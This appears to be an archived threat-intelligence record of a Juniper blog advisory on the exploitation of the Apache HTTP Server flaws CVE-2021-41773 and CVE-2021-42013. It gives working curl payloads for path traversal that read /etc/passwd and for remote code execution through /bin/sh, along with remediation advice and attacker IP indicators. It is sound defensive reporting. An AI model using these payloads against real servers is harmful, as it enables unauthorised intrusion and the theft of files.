{
    "id": "5e563217-57af-40d0-85df-09e80d297d8b",
    "created_at": "2023-01-12T15:00:34.520823Z",
    "updated_at": "2025-03-27T02:08:40.643199Z",
    "deleted_at": null,
    "sha1_hash": "a5e2b97d22e76df4c9cbfe4410dbd6a208ab63af",
    "title": "2021-10-21 - Apache HTTP Server CVE-2021-42013 and CVE-2021-41773 Exploited in the Wild",
    "authors": "",
    "file_creation_date": "2022-05-28T01:21:39Z",
    "file_modification_date": "2022-05-28T01:21:39Z",
    "file_size": 4599751,
    "plain_text": "# Apache HTTP Server CVE-2021-42013 and CVE-2021- 41773 Exploited in the Wild\n\n**blogs.juniper.net/en-us/enterprise-cloud-and-transformation/apache-http-server-cve-2021-42013-and-cve-2021-41773-**\nexploited\n\nOctober 22, 2021\n\nJuniper Threat Labs has been seeing on-going attacks targeting Apache http servers. On\n[October 4, the Apache Software Foundation disclosed CVE-2021-41773, a path traversal 0-](https://httpd.apache.org/security/vulnerabilities_24.html)\nday vulnerability with reports of it being exploited in-the wild. Within one day, several proofsof-concept to exploit the vulnerability surfaced online, that also included an unauthenticated\nremote code execution. Along with these developments, we started seeing active exploitation\nof this vulnerability in our telemetry beginning on October 6.\n\nOn October 7, CVE-2021-42013 published as patch released by Apache for CVE-202141773, was bypassed and several proofs-of-concept to exploit it surfaced online.\n\nJuniper Threat Labs is still seeing exploitation activity coming from multiple sources. Most of\nthe exploitations are targeted toward two specific paths: /etc/passwd and /bin/sh. Below are\na few examples of common requests captured in our telemetry.\n\n\n-----\n\nCVE-2021-41773 Attacks\n\nCVE-2021-42013 Attacks\nLet’s examine how these vulnerabilities can be exploited.\n\n**Vulnerability Details**\n\nCVE-2021-41773 is a directory traversal vulnerability that was introduced as a result of a\nrecent change to path normalization designed to improve performance in the URL validation\nin Apache http server 2.4.49. It was found that if files outside the directories were not\nprotected by the default configuration, “require all denied”, the URL validation could be\nbypassed by the encoding character ‘.’. It was also verified that the vulnerability could be\nused for remote code execution if mod_cgi is enabled.\n\n\n-----\n\nPoCs that surfaced online used multiple variants to perform evasion for path traversal:\n\n**/.%2e/.%2e/.%2e/**\n**_/.%2e%2f.%2e%2f that decodes to: /../../_**\n**_/.%2e/%2e%2e/ that decodes to: /../../_**\n\nOn October 7, CVE-2021-42013 was reported. It was observed that the patch rolled out for\nCVE-2021-41773 in Apache http server 2.4.50 was insufficient. The attackers could map the\nURLs to files outside the directories that can be configured by alias-like directives. If these\nfiles and directories are not protected by the default configuration “require all denied”, it\ncould lead to code execution.\n\nInside Alias.conf\nApache http server version 2.4.51 was released to mitigate these flaws. These vulnerabilities\naffect only Apache web servers running on version 2.4.49 and 2.4.50. Older versions are\nunaffected by this vulnerability.\n\n**Exploitation**\n\nJuniper Threat Labs, set up Apache http server 2.4.49 to simulate the attack scenario.\n\nBelow is the vulnerable configuration:\n\nVulnerable:\n\n<Directory />\nRequire all granted\n</Directory>\n\n\n-----\n\nNOT vulnerable ( DEFAULT ):\n\n<Directory />\nRequire all denied\n</Directory>\n\nVulnerable config in httpd.conf\nWe can check the directory traversal with this one-liner curl command:\n\n**_curl -v –path-as-is http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd_**\n\n\n-----\n\nContents of /etc/passwd retrieved\nPayloads can be modified to view other files also.\n\n**_GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd_**\n**_GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts_**\n**_GET /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/os-release_**\n\nThis issue was fixed in Apache http server version 2.4.50 but was again exploited using\ndouble encoding technique.\n\n\n-----\n\nContents of /etc/passwd retrieved via double encoding\n**Path Traversal to Remote Code Execution (RCE)**\n\nA remote unauthenticated user can create a specially crafted request with malicious code\nembedded in it that can lead to directory traversal and remote code execution. To achieve\nRCE, there are some pre-requisites.\n\n_[RCE is possible on the server only if mod_cgi is enabled. Mod_cgi is disabled in the](https://httpd.apache.org/docs/current/mod/mod_cgi.html)_\n_default Apache http server configuration._\n_Target binary should have executable permissions for /bin/sh._\n\nBelow is the vulnerable configuration of httpd.conf:\n\n\n-----\n\nmod_cgi module enabled in httpd.conf\nWe can check the response with a one-liner curl command:\n\n**_curl ‘http://<Target>/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh’ -d ‘A=|echo;id’ -vv_**\n\n\n-----\n\nTesting remote code execution\n**_curl ‘http://<Target>/cgi-_**\n**_bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh’ –data ‘echo_**\n**_Content-Type: text/plain; echo; id’_**\n\nTesting remote code execution with double encoding\nBy conducting a simple search on Shodan, results shows that there are over 112,000\nApache servers across the globe running on Apache http server version 2.4.49 and almost\n13,000 with version 2.4.50. There might be other vulnerable web servers configured that do\nnot display version information.\n\n\n-----\n\nShodan results for Apache Http Server 2.4.49\nImage Source: Shodan\n\nShodan results for Apache Http Server 2.4.50\n\n\n-----\n\nImage Source: Shodan\n\n**Remediation and Conclusion:**\n\nJuniper Networks’ SRX Series [Next-Generation Firewall (NGFW) customers with an IDP](https://www.juniper.net/us/en/solutions/next-gen-firewall.html)\nlicense are protected against this vulnerability by the signature: HTTP: APACHE: APACHE**PATH-TRAV.**\n\nAt the same time, all customers are recommended to update to the latest stable version of\nApache http server as soon as possible, as per the [advisory released by the Apache](https://httpd.apache.org/security/vulnerabilities_24.html)\nFoundation and to mitigate any risk associated with active exploitation of the flaw.\n\n**Indicators of Compromise:**\n\nBelow are some of the attacker’s IOC’s:\n\n45[.]146.164.110\n\n139[.]59.126.50\n\n128[.]90.166.247\n\n128[.]90.161.152\n\n128[.]90.166.31\n\n157[.]119.200.185\n\n163[.]172.173.238\n\n89[.]248.173.143\n\n145[.]220.25.28\n\n134[.]122.112.12\n\n145[.]220.25.6\n\n161[.]35.86.181\n\n143[.]198.136.88\n\n155[.]138.142.87\n\n167[.]99.133.28\n\n185[.]111.51.118\n\n\n-----\n\n185[.]225.17.102\n\n89[.]46.62.130\n\n137[.]184.69.137\n\n140[.]213.59.194\n\n142[.]93.35.77\n\n143[.]198.62.76\n\n157[.]230.212.97\n\n157[.]230.216.201\n\n157[.]245.153.240\n\n157[.]245.51.232\n\n178[.]128.164.5\n\n46[.]101.59.235\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-10-21 - Apache HTTP Server CVE-2021-42013 and CVE-2021-41773 Exploited in the Wild.pdf"
    ],
    "report_names": [
        "2021-10-21 - Apache HTTP Server CVE-2021-42013 and CVE-2021-41773 Exploited in the Wild.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535634,
    "ts_updated_at": 1743041320,
    "ts_creation_date": 1653700899,
    "ts_modification_date": 1653700899,
    "files": {
        "pdf": "https://archive.orkl.eu/a5e2b97d22e76df4c9cbfe4410dbd6a208ab63af.pdf",
        "text": "https://archive.orkl.eu/a5e2b97d22e76df4c9cbfe4410dbd6a208ab63af.txt",
        "img": "https://archive.orkl.eu/a5e2b97d22e76df4c9cbfe4410dbd6a208ab63af.jpg"
    }
}